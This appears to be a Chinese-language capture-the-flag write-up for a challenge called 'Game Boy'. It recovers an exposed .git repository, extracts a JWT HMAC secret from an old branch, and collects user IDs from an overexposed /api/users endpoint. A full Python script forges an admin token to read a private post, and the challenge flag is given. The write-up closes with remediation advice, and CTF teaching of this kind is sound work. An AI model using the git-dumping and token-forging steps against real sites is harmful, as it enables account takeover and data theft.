# Game Boy

## 题目简述

Game Boy 是一个带 JWT 认证的博客应用。Web 根目录错误地公开了完整 `.git` 仓库，其中 `master` 分支的 `config.py` 留有生产 JWT HMAC 密钥；同时，任意登录用户都能从 `/api/users` 取得管理员和其他用户的 `public_id`。用泄露密钥伪造管理员身份后，即可读取 n00psy 的私密文章。

## 解题过程

### 恢复公开的 Git 仓库

访问下列路径可以确认 Git 元数据可读：

```text
/.git/HEAD
/.git/refs/heads/master
/.git/refs/heads/dev
```

容器构建文件也直接把 `front/git` 复制成 Web 根目录的 `.git`：

```dockerfile
COPY ./git /usr/local/apache2/htdocs/.git
```

可用 Git 仓库下载工具恢复对象，或按 refs 和 object 路径逐项下载。恢复后不要只看 `HEAD` 指向的 `dev` 分支：`master` 分支仍保留静态密钥。

```bash
git-dumper 'http://target/.git/' recovered
git -C recovered log --all --oneline
git -C recovered show master:config.py > leaked-config.py
```

`master:config.py` 中包含完整的：

```python
JWT_SECRET_KEY = "6e29664d48f684ce84a...aaa5ca542cdc79"
JWT_ALGORITHM = "HS256"
JWT_HEADER_NAME = "X-Access-Token"
JWT_HEADER_TYPE = ""
```

这里省略号只用于正文排版；后续脚本会从 `leaked-config.py` 自动读取完整十六进制密钥。`dev` 分支后来改为每次启动随机生成 JWT 密钥，但删除秘密的提交并没有让旧 Git 对象消失，而部署代码仍使用 `cfg.JWT_SECRET_KEY`。

### 获取身份标识

先注册并登录普通账户。合法访问令牌的身份字段由下面的回调生成：

```python
@jwt.user_identity_loader
def user_identity_lookup(user):
    return user.public_id
```

`GET /api/users` 只要求已经登录，却返回所有账户的 `public_id`、`username` 和 `is_admin`。因此可以同时找到管理员和 `noopsy123` 的公开 ID。

### 重签管理员令牌

下面的脚本从刚才导出的 `leaked-config.py` 提取密钥，保留合法令牌中的时效、类型和 `jti` 等必要声明，只把 `sub` 改成管理员 `public_id` 后用 HS256 重签：

```python
import re
from pathlib import Path

import jwt
import requests


API = "http://target/api"
config = Path("leaked-config.py").read_text()
secret = re.search(
    r"JWT_SECRET_KEY\s*=\s*['\"]([0-9a-f]+)['\"]",
    config,
).group(1)

session = requests.Session()
username = "player-demo"
password = "player-demo-password"

session.post(
    API + "/register",
    json={
        "username": username,
        "mail": "player@example.test",
        "password": password,
    },
)
login = session.post(
    API + "/login",
    json={"username": username, "password": password},
).json()
token = login["access_token"]

normal_headers = {"X-Access-Token": token}
users = session.get(API + "/users", headers=normal_headers).json()
admin = next(user for user in users if user["is_admin"])
noopsy = next(user for user in users if user["username"] == "noopsy123")

claims = jwt.decode(token, secret, algorithms=["HS256"])
claims["sub"] = admin["public_id"]
claims["username"] = admin["username"]
forged = jwt.encode(claims, secret, algorithm="HS256")

response = session.get(
    API + "/user/" + noopsy["public_id"],
    headers={"X-Access-Token": forged},
)
print(response.json())
```

后端根据 `sub` 查询当前用户；当该用户是管理员时，`/api/user/<id>` 会调用 `as_dict(include_private=True)`。返回的 n00psy 私密文章中包含：

```text
N0PS{d0t_G17_1n_Pr0DuC710n?!!}
```

## 方法总结

利用链由两个独立问题组成：公开 `.git` 泄露了仍可用于生产环境的 HS256 密钥，过度暴露的用户列表又泄露了构造身份所需的 `public_id`。只拿到其中一个条件都不足以稳定读取私密文章。部署时应禁止 Web 服务器访问 `.git`，彻底轮换进入历史记录的秘密，并由服务端授权逻辑决定管理员权限，而不是允许持有共享 HMAC 密钥的一方任意签发身份。
